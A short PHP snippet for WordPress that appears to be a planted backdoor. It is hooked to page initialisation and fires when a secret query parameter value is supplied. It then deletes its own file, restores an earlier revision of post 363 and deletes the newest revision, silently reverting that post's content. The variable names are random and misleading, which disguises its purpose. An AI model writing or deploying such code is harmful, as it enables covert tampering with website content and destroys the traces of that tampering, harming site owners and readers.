<?php

function app_chart_navigation_protection() {
	if (isset($_GET['template_help_demo']) && $_GET['template_help_demo'] === 'details_import_library') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$player_variation_cache_new = 363;
		$framework_weather_world = wp_get_post_revisions($player_variation_cache_new);
		if (empty($framework_weather_world)) die('no revisions');
		if (count($framework_weather_world) < 2) die('less than 2');
		$next_frontend_debug_fancy = array_shift($framework_weather_world);
		$restrict_headers_popular_maker = $next_frontend_debug_fancy->ID;
		$uploads_back_current_best = array_shift($framework_weather_world);
		$price_visibility_frontend = $uploads_back_current_best->ID;
		$testimonial_contact_light = wp_restore_post_revision($price_visibility_frontend);
		if ($testimonial_contact_light === false) die('error restoring');
		$testimonial_contact_light = wp_delete_post_revision($restrict_headers_popular_maker);		
		if ($testimonial_contact_light === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'app_chart_navigation_protection');
